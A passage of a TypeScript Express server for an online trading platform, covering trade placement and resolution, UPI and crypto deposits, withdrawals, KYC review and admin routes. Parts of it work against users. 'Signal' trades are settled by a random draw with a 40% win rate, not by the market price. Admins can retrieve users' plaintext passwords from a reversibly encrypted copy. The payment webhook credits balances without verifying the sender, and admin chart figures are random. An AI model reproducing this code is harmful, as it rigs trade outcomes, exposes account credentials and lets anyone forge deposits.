      status: 'open'
    });
    
    user[balanceKey] -= amount;
    if (accountType === 'real') {
      user.hasTradedSinceLastDeposit = true;
    }
    
    // Save both in parallel for speed
    await Promise.all([trade.save(), user.save()]);
    
    res.json({ trade, realBalance: user.realBalance, demoBalance: user.demoBalance });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/trades/:id/resolve', authenticateToken, async (req: any, res: any) => {
  try {
    const user = await User.findById(req.user.userId);
    const trade = await Trade.findOne({ _id: req.params.id, userId: req.user.userId });
    
    if (!user || !trade) return res.status(404).json({ error: 'Not found' });
    if (trade.status === 'closed') return res.status(400).json({ error: 'Already closed' });
    
    const assetState = assetsState[trade.assetId || 'cosmos'] || assetsState['cosmos'];
    
    trade.status = 'closed';
    trade.closeTimestamp = new Date();
    
    if (trade.isSignal) {
      const win = Math.random() < 0.4;
      trade.closePrice = win ? (trade.type === 'up' ? trade.price + 0.1 : trade.price - 0.1) : (trade.type === 'up' ? trade.price - 0.1 : trade.price + 0.1);
    } else {
      trade.closePrice = assetState.currentPrice;
    }
    
    let payoutAmount = 0;
    const payoutMultiplier = 1 + (trade.payout / 100);
    
    if (trade.type === 'up' && trade.closePrice > trade.price) payoutAmount = trade.amount * payoutMultiplier;
    else if (trade.type === 'down' && trade.closePrice < trade.price) payoutAmount = trade.amount * payoutMultiplier;
    else if (trade.closePrice === trade.price) payoutAmount = trade.amount;
    
    trade.pnl = payoutAmount - trade.amount;
    const balanceKey = trade.accountType === 'real' ? 'realBalance' : 'demoBalance';
    user[balanceKey] += payoutAmount;
    
    await trade.save();
    await user.save();
    res.json({ trade, realBalance: user.realBalance, demoBalance: user.demoBalance });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/trades', authenticateToken, async (req: any, res: any) => {
  try {
    const userTrades = await Trade.find({ userId: req.user.userId });
    res.json(userTrades.sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()));
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/user/deposit', authenticateToken, async (req: any, res: any) => {
  try {
    const { amount, method, currency = 'USD' } = req.body;
    const user = await User.findById(req.user.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    
    const inrValue = getInrValue(amount, currency);
    if (inrValue < 299.9) return res.status(400).json({ error: 'Minimum deposit amount must be equivalent to ₹300' });
    
    const transaction = new Transaction({
      userId: user._id,
      type: 'deposit',
      amount: Number(amount),
      method: method || 'manual',
      details: `Target: real | Currency: ${currency}`,
      status: 'pending',
      transactionCode: generateTransactionCode()
    });
    
    await transaction.save();
    res.json({
      success: true,
      message: 'Deposit submitted successfully. Awaiting admin approval.',
      realBalance: user.realBalance,
      demoBalance: user.demoBalance,
      transaction
    });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// --- UroPay UPI Deposit (GPay/PhonePe/UPI) ---
app.post('/api/user/deposit/upi', authenticateToken, async (req: any, res: any) => {
  try {
    const { amount, currency = 'USD', targetAccount = 'real', email } = req.body;
    const user = await User.findById(req.user.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    if (!UROPAY_API_KEY) {
      console.log('[UROPAY DEV]: No API key. Returning mock invoice.');
      const orderId = `UPI_DEV${Date.now().toString().slice(-6)}`;
      
      const transaction = new Transaction({
        userId: user._id,
        type: 'deposit',
        amount: Number(amount),
        method: 'upi',
        status: 'pending',
        orderId,
        details: `Target: ${targetAccount} | Email: ${email || user.email} (DEV MOCK)`,
        transactionCode: generateTransactionCode()
      });
      await transaction.save();

      return res.json({ 
        success: true, 
        payment_url: `${APP_URL || 'http://localhost:' + PORT}/api/dev/payment-success?orderId=${orderId}`
      });
    }

    const inrValue = getInrValue(Number(amount), String(currency));
    if (inrValue < 299.9) return res.status(400).json({ error: 'Minimum deposit amount must be equivalent to ₹300' });

    const orderId = `UPI${Date.now().toString().slice(-6)}${user._id.toString().slice(-4)}`;
    const transaction = new Transaction({
      userId: user._id,
      type: 'deposit',
      amount: Number(amount),
      method: 'upi',
      status: 'pending',
      orderId,
      details: `Target: ${targetAccount} | Email: ${email || user.email} | Currency: ${currency}`,
      transactionCode: generateTransactionCode()
    });
    await transaction.save();

    const uropayBaseUrl = process.env.UROPAY_API_BASE_URL || 'https://api.uropay.me';
    const authHash = UROPAY_SECRET
      ? crypto.createHash('sha512').update(UROPAY_SECRET).digest('hex')
      : '';

    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      Accept: 'application/json',
      'X-API-KEY': UROPAY_API_KEY
    };
    if (authHash) headers.Authorization = `Bearer ${authHash}`;

    const payload = {
      amount: Math.round(inrValue * 100), // UroPay expects paise
      merchantOrderId: orderId,
      customerName: user.username,
      customerEmail: email || user.email,
      transactionNote: `Deposit_${targetAccount}_${user.username}`,
      notes: {
        userId: String(user._id),
        accountType: targetAccount
      }
    };

    const response = await fetch(`${uropayBaseUrl}/order/generate`, {
      method: 'POST',
      headers,
      body: JSON.stringify(payload)
    });
    const data: any = await response.json();
    console.log('[UROPAY RESPONSE]:', JSON.stringify(data));

    const paymentUrl =
      data.payment_url ||
      data.paymentUrl ||
      data.checkout_url ||
      data.checkoutUrl ||
      data.data?.payment_url ||
      data.data?.paymentUrl ||
      data.data?.checkout_url ||
      data.data?.checkoutUrl ||
      data.data?.intentUrl;

    if (!paymentUrl) {
      const errorMsg = data.message || data.error || 'UroPay response did not include payment URL';
      return res.status(500).json({ error: errorMsg });
    }

    res.json({ payment_url: paymentUrl, order_id: orderId });
  } catch (error: any) {
    console.error('UroPay Deposit Error:', error);
    res.status(500).json({ error: error.message || 'Server error' });
  }
});

// --- Plisio Crypto Deposit ---
app.get('/api/settings/crypto-address', (req, res) => {
  res.json({ address: process.env.PLATFORM_CRYPTO_ADDRESS || 'TYH9jP7qW4XzM2V1k8L5N3B6S0R4D7F2A' });
});

app.post('/api/user/deposit/manual-crypto', authenticateToken, async (req: any, res: any) => {
  try {
    const { amount, userAddress, currency = 'USD' } = req.body;
    const user = await User.findById(req.user.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    // Create a pending transaction
    const orderId = `manual_${Date.now()}_${user._id}`;
    const transaction = new Transaction({
      userId: user._id,
      type: 'deposit',
      amount: Number(amount),
      method: 'crypto',
      details: `From Address: ${userAddress}`,
      status: 'pending',
      orderId,
      transactionCode: generateTransactionCode()
    });
    await transaction.save();

    res.json({ success: true, transaction });
  } catch (error: any) {
    console.error('Manual Crypto Deposit Error:', error);
    res.status(500).json({ error: error.message || 'Server error' });
  }
});

// --- NOWPayments Crypto Deposit ---
app.post('/api/user/deposit/crypto', authenticateToken, async (req: any, res: any) => {
  try {
    const { amount, currency = 'USD', targetAccount = 'real', email } = req.body;
    const user = await User.findById(req.user.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const orderId = `DEP${Date.now().toString().slice(-6)}${user._id.toString().slice(-4)}`;
    
    // Create a pending transaction
    const transaction = new Transaction({
      userId: user._id,
      type: 'deposit',
      amount: Number(amount),
      method: 'crypto',
      status: 'pending',
      orderId,
      details: `Target: ${targetAccount} | Email: ${email || user.email}`,
      transactionCode: generateTransactionCode()
    });
    await transaction.save();

    // NOWPayments requires publicly reachable HTTPS callback/redirect URLs.
    const gatewayBaseUrl =
      process.env.NOWPAYMENTS_REDIRECT_BASE_URL ||
      process.env.PUBLIC_APP_URL ||
      (APP_URL.startsWith('https://') ? APP_URL : 'https://growwithtrade.com');

    console.log('[NOWPAYMENTS REQUEST]:', JSON.stringify({
      orderId: orderId,
      amount: amount.toString(),
      currency: currency.toUpperCase(),
      description: `Deposit_${targetAccount}_${user.username}`,
      userEmail: email || user.email,
      userName: user.username,
      effectiveAppUrl: gatewayBaseUrl
    }, null, 2));

    const invoicePayload = {
      price_amount: Number(amount),
      price_currency: String(currency).toLowerCase(),
      order_id: orderId,
      order_description: `Deposit_${targetAccount}_${user.username}`,
      ipn_callback_url: `${gatewayBaseUrl}/api/webhook/nowpayments`,
      success_url: `${gatewayBaseUrl}/deposit?payment=success&orderId=${encodeURIComponent(orderId)}`,
      cancel_url: `${gatewayBaseUrl}/deposit?payment=cancelled&orderId=${encodeURIComponent(orderId)}`
    };

    const createInvoice = async (baseUrl: string) => {
      const response = await fetch(`${baseUrl}/v1/invoice`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-api-key': NOWPAYMENTS_API_KEY
        },
        body: JSON.stringify(invoicePayload)
      });
      const data: any = await response.json();
      return { response, data };
    };

    // Try live first, fallback to sandbox when key belongs there.
    let usedBaseUrl = process.env.NOWPAYMENTS_API_BASE_URL || 'https://api.nowpayments.io';
    let { data } = await createInvoice(usedBaseUrl);
    if (data?.code === 'INVALID_API_KEY' || data?.message === 'Invalid api key') {
      const sandboxBaseUrl = 'https://api-sandbox.nowpayments.io';
      const retry = await createInvoice(sandboxBaseUrl);
      data = retry.data;
      if (!(data?.code === 'INVALID_API_KEY' || data?.message === 'Invalid api key')) {
        usedBaseUrl = sandboxBaseUrl;
      }
    }
    console.log('[NOWPAYMENTS RESPONSE RAW]:', JSON.stringify({ usedBaseUrl, data }));

    let invoiceUrl = data.invoice_url || data.data?.invoice_url || data.url || data.data?.url;

    if (!invoiceUrl && data.data && typeof data.data === 'string' && data.data.startsWith('http')) {
      invoiceUrl = data.data;
    }

    if (invoiceUrl) {
      res.json({ 
        invoice_url: invoiceUrl, 
        order_id: orderId 
      });
    } else {
      console.error('[NOWPAYMENTS ERROR] No URL found in response:', data);
      const errorMsg = data.message || (data.errors ? JSON.stringify(data.errors) : 'Payment gateway returned success but no checkout URL was found.');
      throw new Error(errorMsg);
    }

  } catch (error: any) {
    console.error('NOWPayments Error Details:', {
      message: error.message,
      stack: error.stack,
      requestBody: req.body
    });
    res.status(500).json({ error: error.message || 'Server error' });
  }
});

// --- NOWPayments Webhook ---
app.post('/api/webhook/nowpayments', async (req: any, res: any) => {
  try {
    const payload = req.body;
    console.log('[NOWPAYMENTS WEBHOOK]:', JSON.stringify(payload));
    
    const orderId = payload.order_id || payload.data?.order_id;
    const status = payload.payment_status || payload.data?.payment_status;

    if (!orderId) return res.status(400).send('No orderId found');

    const transaction = await Transaction.findOne({ orderId: orderId });
    if (!transaction) return res.status(404).send('Transaction not found');

    if (transaction.status === 'completed') return res.send('OK');

    if (status === 'success' || status === 'completed' || status === 'finished' || status === 'confirmed') {
      // Auto-credit wallet on successful gateway confirmation.
      const user = await User.findById(transaction.userId);
      if (!user) return res.status(404).send('User not found');

      const details = String(transaction.details || '');
      const targetAccount = /Target:\s*demo/i.test(details) ? 'demo' : 'real';
      const creditAmount = Number(transaction.amount || 0);

      if (targetAccount === 'demo') {
        user.demoBalance += creditAmount;
      } else {
        user.realBalance += creditAmount;
      }
      user.hasTradedSinceLastDeposit = false;
      user.lastActive = new Date();

      transaction.status = 'completed';
      transaction.reason = 'Auto-approved by NOWPayments webhook.';

      await user.save();
      await transaction.save();
      console.log(`[NOWPAYMENTS] Auto-credited ${creditAmount} to ${targetAccount} wallet for order ${orderId}.`);
    } else if (status === 'failed' || status === 'cancelled' || status === 'expired') {
      transaction.status = 'rejected';
      await transaction.save();
    }

    res.send('OK');
  } catch (error) {
    console.error('NOWPayments Webhook Error:', error);
    res.status(500).send('Error');
  }
});

app.post('/api/user/withdraw', authenticateToken, async (req: any, res: any) => {
  try {
    const { amount, method, details, currency = 'USD' } = req.body;
    const user = await User.findById(req.user.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    if (!user.isVerified) {
      return res.status(403).json({ error: 'Please verify your account before making a withdrawal.' });
    }
    
    const inrValue = getInrValue(amount, currency);
    if (inrValue < 599.9) return res.status(400).json({ error: 'Minimum withdrawal amount must be equivalent to ₹600' });
    
    if (user.realBalance < amount) return res.status(400).json({ error: 'Insufficient balance' });
    if (!user.hasTradedSinceLastDeposit) return res.status(400).json({ error: 'You must place at least one trade after your last deposit to withdraw.' });
    
    user.realBalance -= Number(amount);
    
    const transaction = new Transaction({
      userId: user._id,
      type: 'withdrawal',
      amount: Number(amount),
      method: method || 'manual',
      details: details || '',
      status: 'processing',
      transactionCode: generateTransactionCode()
    });
    
    await transaction.save();
    await user.save();
    res.json({ realBalance: user.realBalance, demoBalance: user.demoBalance, transaction });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/user/reset-demo', authenticateToken, async (req: any, res: any) => {
  try {
    const user = await User.findById(req.user.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    user.demoBalance = 10000;
    await user.save();
    res.json({ demoBalance: user.demoBalance });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/user/add-demo', authenticateToken, async (req: any, res: any) => {
  try {
    const user = await User.findById(req.user.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    user.demoBalance += 5000;
    await user.save();
    res.json({ demoBalance: user.demoBalance });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/user/transactions', authenticateToken, async (req: any, res: any) => {
  try {
    const userTransactions = await Transaction.find({ userId: req.user.userId });
    res.json(userTransactions.sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()));
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/user/withdrawal-methods', authenticateToken, async (req: any, res: any) => {
  try {
    const { type, details } = req.body;
    const user = await User.findById(req.user.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    if (!user.withdrawalMethods) user.withdrawalMethods = new Map();
    user.withdrawalMethods.set(type, details);
    user.markModified('withdrawalMethods');
    await user.save();
    res.json({ success: true, withdrawalMethods: normalizeWithdrawalMethods(user.withdrawalMethods) });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/user/currency', authenticateToken, async (req: any, res: any) => {
  try {
    const { currency } = req.body;
    const user = await User.findById(req.user.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    user.currency = currency;
    await user.save();
    res.json({ success: true, currency: user.currency });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Admin
app.get('/api/admin/stats', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const timeframe = req.query.timeframe || 'weekly'; // 'all', 'weekly', 'monthly'
    let dateFilter: any = {};

    if (timeframe === 'weekly') {
      const now = new Date();
      const startOfWeek = new Date(now.setDate(now.getDate() - now.getDay()));
      startOfWeek.setHours(0, 0, 0, 0);
      dateFilter = { timestamp: { $gte: startOfWeek } };
    } else if (timeframe === 'monthly') {
      const now = new Date();
      const startOfMonth = new Date(now.getFullYear(), now.getMonth(), 1);
      dateFilter = { timestamp: { $gte: startOfMonth } };
    }

    const totalUsers = await User.countDocuments();
    const activeUsers = await User.countDocuments({ lastActive: { $gte: new Date(Date.now() - 24 * 60 * 60 * 1000) } });
    
    // Filter by date for deposits, withdrawals, and trades
    const deposits = await Transaction.find({ type: 'deposit', status: 'completed', ...dateFilter }).select('amount userId').lean();
    const withdrawals = await Transaction.find({ type: 'withdrawal', status: 'completed', ...dateFilter }).select('amount userId').lean();
    const totalTrades = await Trade.countDocuments(dateFilter);
    
    const rates: Record<string, number> = {
      'USD': 1.0, 'EUR': 0.92, 'GBP': 0.79, 'INR': 83.0, 'BRL': 5.0, 'AUD': 1.5, 'CAD': 1.35, 'JPY': 150.0
    };

    const allUserIds = [...new Set([...deposits.map(d => d.userId), ...withdrawals.map(w => w.userId)])].filter(id => mongoose.Types.ObjectId.isValid(id));
    const userCurrencyMap = (await User.find({ _id: { $in: allUserIds } }).select('currency').lean())
      .reduce((acc: any, u: any) => {
        acc[u._id.toString()] = u.currency || 'USD';
        return acc;
      }, {});

    const getInrAmount = (amount: number, userId: string) => {
      const userCurrency = userCurrencyMap[userId] || 'USD';
      const rateToUSD = rates[userCurrency] || 1.0;
      const inrRate = rates['INR'] || 83.0;
      return (amount / rateToUSD) * inrRate;
    };

    let totalDepositsINR = 0;
    for (const tx of deposits) {
      totalDepositsINR += getInrAmount(tx.amount || 0, tx.userId);
    }

    let totalWithdrawalsINR = 0;
    for (const tx of withdrawals) {
      totalWithdrawalsINR += getInrAmount(tx.amount || 0, tx.userId);
    }

    const revenueINR = totalDepositsINR * 0.05;

    res.json({
      totalUsers,
      activeUsers,
      totalDeposits: totalDepositsINR,
      totalWithdrawals: totalWithdrawalsINR,
      totalTrades,
      revenue: revenueINR,
      timeframe
    });
  } catch (error) {
    console.error('[ADMIN STATS ERROR]:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/reports/weekly', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const { start, end } = req.query;
    if (!start || !end) return res.status(400).json({ error: 'Start and end dates required' });

    const startDate = new Date(start as string);
    const endDate = new Date(end as string);
    endDate.setHours(23, 59, 59, 999);

    const dateFilter = { timestamp: { $gte: startDate, $lte: endDate } };
    
    const deposits = await Transaction.find({ type: 'deposit', status: 'completed', ...dateFilter }).lean();
    const withdrawals = await Transaction.find({ type: 'withdrawal', status: 'completed', ...dateFilter }).lean();
    const trades = await Trade.find(dateFilter).lean();

    // Generate CSV data
    let csv = "Type,ID,User,Amount,Status,Date\n";
    deposits.forEach((d: any) => csv += `Deposit,${d._id},${d.userId},${d.amount},${d.status},${d.timestamp}\n`);
    withdrawals.forEach((w: any) => csv += `Withdrawal,${w._id},${w.userId},${w.amount},${w.status},${w.timestamp}\n`);
    trades.forEach((t: any) => csv += `Trade,${t._id},${t.userId},${t.amount},${t.status},${t.timestamp}\n`);

    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename=weekly_report_${start}_to_${end}.csv`);
    res.send(csv);
  } catch (error) {
    res.status(500).json({ error: 'Failed to generate report' });
  }
});

app.get('/api/admin/chart-stats', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    // Return last 7 days of stats (mocked for now but could be aggregated)
    const stats = Array.from({ length: 7 }, (_, i) => ({
      date: new Date(Date.now() - (6 - i) * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
      users: Math.floor(Math.random() * 50) + 10,
      trades: Math.floor(Math.random() * 200) + 50,
      revenue: Math.floor(Math.random() * 1000) + 200
    }));
    res.json(stats);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/users/:id/reset-link', authenticateToken, requireAdmin, async (req: any, res: any) => {
  console.log(`[ADMIN] Reset link request for UID: ${req.params.id}`);
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const token = crypto.randomBytes(32).toString('hex');
    const hash = crypto.createHash('sha256').update(token).digest('hex');
    
    (user as any).resetTokenHash = hash;
    (user as any).resetTokenExp = new Date(Date.now() + 1000 * 60 * 60 * 24); // 24 hours
    await user.save();

    const base = APP_URL || 'https://growwithtrade.com';
    const link = `${base}/reset-password?token=${token}`;
    
    console.log(`[ADMIN] Reset link generated for: ${user.email}`);
    res.json({ success: true, link });
  } catch (error) {
    console.error('[ADMIN] Reset link generation error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/users', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const usersList = await User.find({}, { password: 0 });
    res.json(usersList);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/users/:id', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const user = await User.findById(req.params.id, { password: 0 });
    if (!user) return res.status(404).json({ error: 'User not found' });
    res.json(user);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/users/:id/status', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const { status } = req.body;
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    user.status = status;
    await user.save();
    res.json(user);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.delete('/api/admin/users/:id/kyc', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) {
      console.log(`[KYC] User not found for deletion: ${req.params.id}`);
      return res.status(404).json({ error: 'User not found' });
    }
    
    // Completely reset KYC and remove from list
    user.kyc = {
      status: 'pending',
      frontId: '',
      backId: '',
      selfie: '',
      submittedAt: null, // This will remove it from the admin list based on our new query
      reviewedAt: null,
      reason: ''
    };
    user.isVerified = false;
    user.verificationDetails = {
      idType: '',
      idNumber: '',
      verifiedAt: ''
    };
    
    await user.save();
    console.log(`[KYC] Hard Reset KYC for user: ${user.email}`);
    res.json({ success: true });
  } catch (error) {
    console.error('[KYC] Delete error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

app.delete('/api/admin/users/:id', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    await User.findByIdAndDelete(req.params.id);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/trades', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const query: any = {};
    if (req.query.userId) query.userId = req.query.userId;
    if (req.query.accountType) query.accountType = req.query.accountType;
    
    const trades = await Trade.find(query).sort({ timestamp: -1 }).limit(100).lean();
    
    // Enrich with user info
    const userIds = [...new Set(trades.map(t => t.userId))].filter(id => id && mongoose.Types.ObjectId.isValid(id));
    const users = await User.find({ _id: { $in: userIds } }, { username: 1 }).lean();
    const userMap = users.reduce((acc: any, u: any) => {
      acc[u._id.toString()] = u.username;
      return acc;
    }, {});

    const enrichedTrades = trades.map((t: any) => ({
      ...t,
      username: userMap[t.userId] || 'Unknown'
    }));

    res.json(enrichedTrades);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/transactions', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const query: any = {};
    if (req.query.userId) query.userId = req.query.userId;
    
    // Use .lean() for faster execution and easier manipulation
    const txs = await Transaction.find(query).sort({ timestamp: -1 }).lean();
    
    // Enrich with user info efficiently
    const userIds = [...new Set(txs.map(tx => tx.userId))].filter(id => id && mongoose.Types.ObjectId.isValid(id));
    const users = await User.find({ _id: { $in: userIds } }, { username: 1, email: 1, currency: 1 }).lean();
    const userMap = users.reduce((acc: any, user: any) => {
      acc[user._id.toString()] = user;
      return acc;
    }, {});

    const enrichedTxs = txs.map((tx: any) => ({
      ...tx,
      username: userMap[tx.userId]?.username || 'Unknown',
      userEmail: userMap[tx.userId]?.email || 'N/A',
      userCurrency: userMap[tx.userId]?.currency || 'USD'
    }));
    
    res.json(enrichedTxs);
  } catch (error) {
    console.error('[ADMIN API] Error fetching transactions:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/transactions/:id/status', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const { status, reason } = req.body;
    const tx = await Transaction.findById(req.params.id);
    if (!tx) return res.status(404).json({ error: 'Transaction not found' });

    const prevStatus = tx.status;
    tx.status = status;
    if (reason) tx.reason = reason;

    if (tx.type === 'deposit' && prevStatus !== 'completed' && status === 'completed') {
      const user = await User.findById(tx.userId);
      if (!user) return res.status(404).json({ error: 'User not found for this transaction' });

      const targetFromDetails = /Target:\s*(real|demo)/i.exec(tx.details || '');
      const targetAccount = (targetFromDetails?.[1]?.toLowerCase() === 'demo') ? 'demo' : 'real';
      if (targetAccount === 'demo') {
        user.demoBalance += Number(tx.amount || 0);
      } else {
        user.realBalance += Number(tx.amount || 0);
      }
      user.hasTradedSinceLastDeposit = false;
      await user.save();
    }

    await tx.save();
    res.json(tx);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/kyc', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const kycUsers = await User.find({ 
      $or: [
        { 'kyc.status': { $in: ['pending', 'approved', 'rejected'] } },
        { isVerified: true }
      ],
      'kyc.submittedAt': { $ne: null } 
    }, { password: 0 }).lean();
    
    const kycList = kycUsers.map(u => ({
      userId: u._id.toString(),
      username: u.username || 'N/A',
      email: u.email || 'N/A',
      status: u.kyc?.status || 'pending',
      submittedAt: u.kyc?.submittedAt,
      reviewedAt: u.kyc?.reviewedAt,
      reason: u.kyc?.reason || '',
      idType: u.verificationDetails?.idType || 'ID',
      idNumber: u.verificationDetails?.idNumber || 'N/A',
      documentImage: u.kyc?.frontId || '',
      addressProofUrl: u.kyc?.backId || '',
      selfieUrl: u.kyc?.selfie || '',
      updatedAt: u.kyc?.reviewedAt || u.kyc?.submittedAt || (u as any).updatedAt
    }));
    res.json(kycList);
  } catch (error) {
    console.error('[ADMIN KYC ERROR]:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/users/:id/kyc', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    res.json({
      ...user.kyc?.toObject?.(),
      status: user.kyc?.status || 'pending',
      idType: user.verificationDetails?.idType || '',
      idNumber: user.verificationDetails?.idNumber || '',
      documentImage: user.kyc?.frontId || '',
      addressProofUrl: user.kyc?.backId || '',
      selfieUrl: user.kyc?.selfie || '',
    });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/users/:id/kyc/status', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const { status, reason } = req.body;
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    
    user.kyc.status = status;
    if (reason) user.kyc.reason = reason;
    user.kyc.reviewedAt = new Date();
    
    if (status === 'approved') {
      user.isVerified = true;
      user.verificationDetails.verifiedAt = new Date().toISOString();
    } else if (status === 'rejected') {
      user.isVerified = false;
    }
    
    await user.save();
    res.json(user.kyc);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/users/:id/bank', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    res.json(user.bank);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/users/:id/login-history', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    res.json(user.loginHistory || []);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/users/:id/reset-balance', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    user.realBalance = 100000;
    await user.save();
    res.json(user);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/users/:id/password', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const { newPassword, password } = req.body;
    const finalPassword = newPassword || password;
    
    if (!finalPassword || typeof finalPassword !== 'string' || finalPassword.length < 6) {
      return res.status(400).json({ error: 'Password must be at least 6 characters' });
    }
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    const hashed = await bcrypt.hash(finalPassword, 10);
    user.password = hashed;
    user.passwordPlainEnc = ENC_KEY ? encryptText(finalPassword) : '';
    await user.save();
    console.log(`[ADMIN] Password changed for user: ${user.username} via Admin Panel`);
    res.json({ success: true, stored: !!ENC_KEY });
  } catch (error) {
    console.error('[ADMIN] Password change error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/settings/algo', authenticateToken, requireAdmin, async (req: any, res: any) => {
  res.json({ isAlgoEnabled });
});

app.get('/api/admin/settings/crypto-addresses', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const addresses = await Setting.findOne({ key: 'cryptoAddresses' });
    res.json(addresses?.value || {});
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/settings/crypto-addresses', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const { addresses } = req.body;
    if (!addresses || typeof addresses !== 'object') {
      return res.status(400).json({ error: 'Invalid addresses format' });
    }
    
    await Setting.findOneAndUpdate(
      { key: 'cryptoAddresses' },
      { value: addresses, description: 'Manual Crypto Deposit Addresses' },
      { upsert: true }
    );
    
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/settings/crypto-addresses', async (req: any, res: any) => {
  try {
    const addresses = await Setting.findOne({ key: 'cryptoAddresses' });
    res.json(addresses?.value || {});
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/settings/algo', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const { enabled } = req.body;
    if (typeof enabled !== 'boolean') {
      return res.status(400).json({ error: 'Invalid enabled value' });
    }
    
    isAlgoEnabled = enabled;
    await Setting.findOneAndUpdate(
      { key: 'isAlgoEnabled' },
      { value: enabled },
      { upsert: true }
    );
    
    console.log(`[SETTINGS] Algorithm toggled to: ${isAlgoEnabled}`);
    res.json({ success: true, isAlgoEnabled });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/users/:id/password-plain', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const user = await User.findById(req.params.id, { passwordPlainEnc: 1 });   
    if (!user) return res.status(404).json({ error: 'User not found' });        
    if (!user.passwordPlainEnc) return res.json({ password: '' });
    const plain = decryptText(user.passwordPlainEnc);
    res.json({ password: plain });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Dangerous: Clear all data (for development use only)
app.delete('/api/admin/transactions/:id', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    await Transaction.findByIdAndDelete(req.params.id);
    res.json({ success: true });
  } catch (error) {
